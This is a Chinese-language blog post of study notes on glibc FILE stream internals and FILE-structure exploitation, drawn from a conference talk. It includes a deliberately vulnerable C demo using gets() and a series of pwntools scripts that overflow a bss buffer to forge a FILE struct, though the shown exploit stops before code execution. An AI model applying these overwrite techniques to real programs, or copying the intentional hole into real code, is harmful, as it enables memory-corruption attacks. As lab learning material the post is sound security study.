@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="之前被大神推薦說可以學一下這篇的攻擊技巧 很實用下面是公開的影片與投影片https://www.youtube.com/watch?v=_ZnnGZygnzEhttps://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-techniquehttps://gsec.hitb.org/materials/sg2018/D1%20-%20FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf
+以此來做一下筆記
+IntroductionFile stream為了效能考量，透過 fopen 等等對檔案操作的 function 並不會那麼頻繁的讀取硬碟，通常都會有一個 buffer 做為緩衝給程式做讀取（畢竟讀記憶體比讀硬碟還要快很多）所以整個 file stream 大概長這個樣子（在簡報第 7 頁）其中的 Stream  Buffer 是用來減少使用 syscall 的次數，就是連讀取 kernel buffer 的次數都減少，而 FILE 的結構，今天的主題也在其中
+FILE StructureFILE 的結構很複雜，這邊列出 soruce code因為很複雜，所以這邊僅針對 exploit 所需要的部分進行說明
+Flags_flags 主要是標記文件的屬性 (attribute)
+
+Read only 
+Write only
+Read/Write
+Append
+…">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="AStar">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="Play with FILE Structure Note"/>
+    
+
+    <!--Open Graph Description-->
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="AStar&#39;s Blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+        <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>Play with FILE Structure Note - AStar&#39;s Blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet"/>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css">
+    <link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Google Analytics -->
+    
+
+
+    <!-- favicon -->
+    
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">AStar</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav navbar-right">
+                
+                    <li>
+                        <a href="/">
+                            
+                                Home
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/archives">
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/tags">
+                            
+                                Tags
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/categories">
+                            
+                                Categories
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a target="_blank" rel="noopener" href="https://github.com/klugjo/hexo-theme-clean-blog">
+                            
+                                <i class="fa fa-github fa-stack-2x"></i>
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('https://i.imgur.com/mUijvOa.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <h1>Play with FILE Structure Note</h1>
+                    
+                    <span class="meta">
+                        <!-- Date and Author -->
+                        
+                        
+                            2021-12-11
+                        
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Tags and categories -->
+           
+
+            <!-- Gallery -->
+            
+
+            <!-- Post Main Content -->
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <p>之前被大神推薦說可以學一下這篇的攻擊技巧 很實用<br>下面是公開的影片與投影片<br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=_ZnnGZygnzE">https://www.youtube.com/watch?v=_ZnnGZygnzE</a><br><a target="_blank" rel="noopener" href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique">https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique</a><br><a target="_blank" rel="noopener" href="https://gsec.hitb.org/materials/sg2018/D1%20-%20FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf">https://gsec.hitb.org/materials/sg2018/D1%20-%20FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf</a></p>
+<p>以此來做一下筆記</p>
+<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><h2 id="File-stream"><a href="#File-stream" class="headerlink" title="File stream"></a>File stream</h2><p>為了效能考量，透過 <code>fopen</code> 等等對檔案操作的 function 並不會那麼頻繁的讀取硬碟，通常都會有一個 buffer 做為緩衝給程式做讀取（畢竟讀記憶體比讀硬碟還要快很多）<br>所以整個 file stream 大概長這個樣子（在簡報第 7 頁）<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_1.png" alt=""><br>其中的 <code>Stream  Buffer</code> 是用來減少使用 syscall 的次數，就是連讀取 kernel buffer 的次數都減少，而 <code>FILE</code> 的結構，今天的主題也在其中</p>
+<h3 id="FILE-Structure"><a href="#FILE-Structure" class="headerlink" title="FILE Structure"></a>FILE Structure</h3><p><code>FILE</code> 的結構很複雜，這邊列出 soruce code<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_2.png" alt=""><br>因為很複雜，所以這邊僅針對 exploit 所需要的部分進行說明</p>
+<h4 id="Flags"><a href="#Flags" class="headerlink" title="Flags"></a>Flags</h4><p><img src="/img/2021/linux_file_exploit/linux_file_exploit_3.png" alt=""><br><code>_flags</code> 主要是標記文件的屬性 (attribute)</p>
+<ul>
+<li>Read only </li>
+<li>Write only</li>
+<li>Read/Write</li>
+<li>Append</li>
+<li>…</li>
+</ul>
+<p>詳細的屬性列表可以從這邊看<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/latest/source/libio/libio.h#L67">https://elixir.bootlin.com/glibc/latest/source/libio/libio.h#L67</a><br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/latest/source/bits/fcntl.h#L25">https://elixir.bootlin.com/glibc/latest/source/bits/fcntl.h#L25</a></p>
+<h4 id="Stream-Buffer"><a href="#Stream-Buffer" class="headerlink" title="Stream Buffer"></a>Stream Buffer</h4><p>stream buffer 指的就是這一塊<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_4.png" alt=""><br>stream buffer 可以分為三個</p>
+<ul>
+<li>Read buffer<ul>
+<li><code>_IO_read_ptr</code></li>
+<li><code>_IO_read_end</code></li>
+<li><code>_IO_read_base</code></li>
+</ul>
+</li>
+<li>Write buffer<ul>
+<li><code>_IO_write_base</code></li>
+<li><code>_IO_write_ptr</code></li>
+</ul>
+</li>
+<li>Reserv buffer<ul>
+<li><code>_IO_buf_base</code></li>
+<li><code>_IO_buf_base</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="Fileno"><a href="#Fileno" class="headerlink" title="Fileno"></a>Fileno</h4><ul>
+<li>obtain file descriptor of a stdio stream</li>
+<li>always called by sys_open</li>
+</ul>
+<h4 id="FILE-Plus"><a href="#FILE-Plus" class="headerlink" title="FILE Plus"></a>FILE Plus</h4><p>如果直接在 C 語言內 使用 <code>FILE</code> 這個型別的話其實是使用 <code>_IO_FILE_plus</code>，它是建立在 <code>FILE</code> 結構上的一個 Structure<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_5.png" alt=""><br><code>_IO_FILE_plus</code> 有以下的特點</p>
+<ul>
+<li>base on <code>FILE</code> Structure</li>
+<li>stdin/stdout/stderr <ul>
+<li><img src="/img/2021/linux_file_exploit/linux_file_exploit_6.png" alt=""></li>
+</ul>
+</li>
+<li>virtual function tables (vtable)<ul>
+<li>Every operaction on file is via vtable</li>
+<li><img src="/img/2021/linux_file_exploit/linux_file_exploit_7.png" alt=""></li>
+</ul>
+</li>
+</ul>
+<h4 id="chain"><a href="#chain" class="headerlink" title="chain"></a>chain</h4><p>所有被開啟的檔案（的 file descriptor，簡稱 <code>fp</code>）都是透過 <code>*chain</code> 進行串聯 (link list) 形成的單鍊表<br>並且由 <code>_IO_list_all</code> 進行管理</p>
+<p>經過 trace 之後大概搞清楚了，附上參考的網站<br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/177910">https://www.anquanke.com/post/id/177910</a></p>
+<p>附上網站內的 trace source code<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line"></span><br><span class="line">    FILE*fp=fopen(&quot;test&quot;,&quot;wb&quot;);</span><br><span class="line">    char *ptr=malloc(0x20);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>首先把斷點停在 <code>fopen</code> 之前然後看一下…這邊溫馨提醒下記得裝 <code>libc6-dbg</code> 然後在 gdb 內下 <code>set verbose on</code>，這樣進去 libc 後才有 symbol 可以看<br>這邊先給大家一個概念， <code>fopen</code> 裡面也是透過 malloc 去做初始化 buffer 的，意思就是用到才會進行初始化，並不是程式一開就弄好 buffer 了，詳細初始化過程可以看上面的連結</p>
+<p>初始化前的狀態<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_8.png" alt=""><br>初始化前 <code>fp</code> 就只是存在於 stack 一個普通的變數</p>
+<p>之後就 call 了 <code>fopen</code>，在 <code>_IO_new_fopen</code> 裡面就 call 了 <code>malloc</code><br><img src="/img/2021/linux_file_exploit/linux_file_exploit_9.png" alt=""></p>
+<p>再來就是做一些 init 的行為，一樣詳細的部分可以看上面給的連結，我這邊就只大概帶過<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_10.png" alt=""><br>值得注意的是 <code>_IO_list_all</code> 在未初始化時指向的是 <code>_IO_2_1_stderr_</code><br><img src="/img/2021/linux_file_exploit/linux_file_exploit_12.png" alt=""><br>這跟 source code 的部分可以對上<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_11.png" alt=""><br>靜態我只 trace 到這邊，根據投影片的內容他其實固定是<br><code>IO_list_all</code>-&gt;<code>stderr</code>-&gt;<code>stdout</code>-&gt;<code>stdin</code><br><img src="/img/2021/linux_file_exploit/linux_file_exploit_13.png" alt=""><br>這邊我是透過動態追蹤得出的<br>在經過一連串的 init 之後，<code>_IO_list_all</code> 指向了 heap 區段了<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_14.png" alt=""><br>並且他的位址變的跟 <code>fp</code> 是一樣的，也就是 <code>fp</code> 的位址從 stack 轉到了 heap<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_15.png" alt=""><br>裡面的 <code>_chain</code> 變成了 <code>stderr</code><br><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_list_all.png" alt=""><br>之後就跟投影片上畫的一樣，一個串一個<br><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_2_1_stderr_.png" alt=""></p>
+<p><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_2_1_stdout_.png" alt=""></p>
+<p><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_2_1_stdin_.png" alt=""></p>
+<p>然後他們指向的都是 <code>FILE</code> 結構的開頭<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_16.png" alt=""><br>原本還想說要不要自己畫那個 chain 的圖，想想就算自己畫應該跟投影片的也相差無幾，就算了</p>
+<h4 id="workflow"><a href="#workflow" class="headerlink" title="workflow"></a>workflow</h4><h5 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h5><p>source code<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_fopen_function.png" alt=""></p>
+<ol>
+<li>首先透過 malloc申請一塊用來存放 <code>FILE Structure</code> 的記憶體空間<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_9.png" alt=""></li>
+<li>透過 <code>_IO_no_init</code> 將 <code>FILE Structure</code> 進行 null 初始化<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_10.png" alt=""><br><img src="/img/2021/linux_file_exploit/linux_file_exploit_18.png" alt=""></li>
+<li>透過 <code>_IO_new_file_init_internal</code> 呼叫 <code>_IO_link_in</code>，將此空間 link 進 <code>_IO_list_all</code> 的最上層<br><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_new_file_init_internal.png" alt=""><br><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_link_in.png" alt=""> </li>
+<li>最後再調用 <code>_IO_file_open</code>，藉由裡面呼叫 open 的 syscall 對 file 進行操作<br><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_file_open.png" alt=""></li>
+</ol>
+<p>直接用簡報的圖片呈現重點<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_17.png" alt=""></p>
+<h5 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h5><p>source code<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_fread_function.png" alt=""><br>追 code 得知 fread 實際 implement 的 function 是 <code>_IO_fread</code><br>而 <code>_IO_sgetn</code> 實際上是呼叫 <code>_IO_XSGETN</code><br><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_sgetn.png" alt=""><br>這個 <code>_IO_XSGETN</code> 實際上就是 vtable (<code>_IO_jump_t</code>) 裡面的 <code>__xsgetn</code><br><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_XSGETN.png" alt=""></p>
+<p><img src="/img/2021/linux_file_exploit/linux_file_exploit_vtable_list.png" alt=""></p>
+<p>最終會跳到 <code>_IO_file_xsgetn</code>，這邊靜態 trace 太累了，直接靠動態追蹤得出解答<br><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_file_xsgetn.png" alt=""></p>
+<p><code>_IO_file_xsgetn</code> source code，這邊其實就是 fread 的核心<br><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_file_xsgetn_source.png" alt=""></p>
+<p>簡單說下 fread 在幹嘛</p>
+<ol>
+<li>fread 實際上是呼叫 <code>_IO_fread</code>，如果 <code>fp-&gt;_IO_buf_base</code> 為 NULL，則呼叫位於 vtable 的 <code>_IO_doallocbuf</code> (__doallocate) 初始化緩衝區<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_19.png" alt=""></li>
+<li>如果緩衝區內有足夠空間的話，即 <code>fp-&gt;_IO_read_ptr</code> 小於 <code>fp-&gt;_IO_read_end</code> (有 range)且大於需要的空間時，則將 user_data 直接 memcpy 進去 stream buffer<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_20.png" alt=""></li>
+<li>假如 stream buffer 為空 (flush) 或是 stream buffer 空間不夠的時候，則呼叫位於 vtable 的 <code>__underflow</code>，再利用裡面的 <code>sys_read</code> 將資料讀進來<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_21.png" alt=""><br><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_new_file_underflow.png" alt=""><br><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_SYSREAD.png" alt=""></li>
+</ol>
+<p>最後用簡報的圖片呈現重點<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_22.png" alt=""></p>
+<h5 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h5><p>soruce code<br><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_fwrite.png" alt=""><br><code>_IO_sputn</code> 實際上是呼叫 <code>_IO_XSPUTN</code>，也就是 vtable 裡面的 <code>__xsputn</code><br><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_sputn.png" alt=""></p>
+<p><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_XSPUTN.png" alt=""><br>再往下追實際呼叫的就是 <code>_IO_new_file_xsputn</code><br><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_new_file_xsputn.png" alt=""><br>source code<br><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_new_file_xsputn_source.png" alt=""></p>
+<p>簡單說下 fwrite 在幹嘛</p>
+<ol>
+<li>查看目前 stream buffer 是否為 NULL，如果為 NULL 則呼叫 <code>_IO_OVERFLOW</code> (__overflow) 裡面的 <code>_IO_doallocbuf</code> (__doallocate) 初始化緩衝區<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_23.png" alt=""><br><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_OVERFLOW.png" alt=""><br><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_new_file_overflow.png" alt=""></li>
+<li>如果緩衝區有足夠空間的話，則將 user_data 直接 memcpy 進去 stream buffer<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_24.png" alt=""></li>
+<li>假如 stream buffer 為空 (flush) 或是 stream buffer 空間不夠的時候，則利用 <code>_IO_new_file_xsputn</code> 裡面的 <code>new_do_write</code>，往內追就會看到 sys_write 將資料直接寫進檔案內<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_25.png" alt=""><br><img src="/img/2021/linux_file_exploit/linux_file_exploit_new_do_write.png" alt=""></li>
+<li>要知道IO寫入檔案是用一塊一塊的方式寫進去，所以將資料都寫入檔案後，如果還有其他破碎的資料的話，則會呼叫 <code>_IO_default_xsputn</code> 將剩餘的資料寫回 stream buffer 內<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_27.png" alt=""><br><img src="/img/2021/linux_file_exploit/linux_file_exploit_26.png" alt=""></li>
+</ol>
+<p>一樣附上簡報的 overview 版本<br>  <img src="/img/2021/linux_file_exploit/linux_file_exploit_28.png" alt=""></p>
+<h5 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h5><p>source code<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_fclose_function.png" alt=""><br><code>fclose</code> 往下追他真正的 function 是 <code>_IO_new_fclose</code>，他主要有以下幾個動作</p>
+<ol>
+<li>呼叫 <code>_IO_un_link</code> 把文件整個 <code>FILE</code> 結構從 <code>_IO_list_all</code> 中取出<br><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_un_link.png" alt=""></li>
+<li>呼叫 <code>_IO_file_close_it</code>，利用裡面的 <code>_IO_do_flush</code> flush 並釋放 stream buffer<br><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_new_file_close_it.png" alt=""></li>
+<li>呼叫 <code>_IO_FINISH</code>（__finish）做最後的確認，從 source code 可以看到他會確認文件是否是開啟的狀態，如果是開啟的話它會 flush 並且呼叫 <code>_IO_SYSCLOSE</code> 關閉文件，在最後呼叫一次 <code>_IO_default_finish</code> 做最後確認，確認是否 stream buffer 被釋放和從 <code>_IO_list_all</code> 中取下<br><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_new_file_finish.png" alt=""><br><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_new_file_finish_source.png" alt=""><br><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_default_finish.png" alt=""></li>
+</ol>
+<p>附上簡圖<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_29.png" alt=""></p>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h2><p>FILE Structure Exploit 主要是從 <code>vtable</code> 上下手，從上面的介紹可以看到我們動到檔案的話基本上都離不開 <code>vtable</code></p>
+<p>這邊先給上 demo 的 source code</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">char buf[0x100] = &#123;0&#125;;</span><br><span class="line">FILE *fp;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">        fp = fopen(&quot;key.txt&quot;, &quot;rw+&quot;);</span><br><span class="line">        puts(&quot;hi&quot;);</span><br><span class="line">        gets(buf);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>checksec (run in ubuntu 14.04, before libc 2.24)<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_demo_1.png" alt=""> </p>
+<p>因為我們是蓋 bss 段，所以其實有沒有 stack canary 都沒什麼關係，先 overflow 看看<br>可以看到他會讀 <code>rdi</code> 裡面的資訊，而 <code>rdi</code> 會是我們的 gadget 因此要改成一個合法的位址<br>這邊我們是練習用的，所以把 PIE 關了，這邊我們指一個合法的位址給他<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./example&quot;)</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">buf = 0x601080</span><br><span class="line">buf2 = buf+0x500</span><br><span class="line">offset = 256</span><br><span class="line">payload = cyclic(256) + p64(buf)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;hi&quot;)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">raw_input()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><br>執行後<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_demo_2.png" alt=""><br>可以看到這次死在 <code>fclose</code>，因為塞進裡面的是 cyclic 的 gadget 所以可以輕易地算出 offset 一樣給他一個 vaild address<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./example&quot;)</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">buf = 0x601080</span><br><span class="line">buf2 = buf+0x500</span><br><span class="line">offset = 256</span><br><span class="line">payload = cyclic(136) + p64(buf2) + cyclic(0x100-136-8) + p64(buf)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;hi&quot;)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">raw_input()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><br><img src="/img/2021/linux_file_exploit/linux_file_exploit_demo_3.png" alt=""><br>現在就是不停的滿足他的條件，給他合法的記憶體位置<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./example&quot;)</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">buf = 0x601080</span><br><span class="line">buf2 = buf+0x500</span><br><span class="line">offset = 256</span><br><span class="line">payload = cyclic(24) + p64(buf2) +  cyclic(136-24-8) + p64(buf2) + cyclic(0x100-136-8) + p64(buf)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;hi&quot;)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">raw_input()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><br><img src="/img/2021/linux_file_exploit/linux_file_exploit_demo_4.png" alt=""><br>到這一步之後很明顯的就是被 raise error，而且畫面還說了 <code>free invaile pointer</code><br>追進去後發現原來是死在 <code>_IO_unsave_markers</code><br><img src="/img/2021/linux_file_exploit/linux_file_exploit__IO_unsave_markers.png" alt=""><br>當中的 <code>if (_IO_have_backup (fp))</code> 為 true 時就會執行 free 的動作從而導致 raise error<br>而 <code>_IO_have_backup</code> 其實也就是看 <code>_IO_save_base</code> 是否為 NULL 而已<br><code>#define _IO_have_backup(fp) ((fp)-&gt;_IO_save_base != NULL)</code><br>所以我們蓋的時候記得把 <code>_IO_save_base</code> 蓋成 0 就可以繞過這個 free 的動作了，詳細要蓋的位置<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_demo_5.png" alt=""></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./example&quot;)</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">buf = 0x601080</span><br><span class="line">buf2 = buf+0x500</span><br><span class="line">buf3 = buf+0x600</span><br><span class="line">offset = 256</span><br><span class="line">payload = cyclic(24) + p64(0) +cyclic(136-24-8) + p64(buf2) + cyclic(0x100-136-8) + p64(buf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;hi&quot;)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">raw_input()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="/img/2021/linux_file_exploit/linux_file_exploit_demo_6.png" alt=""></p>
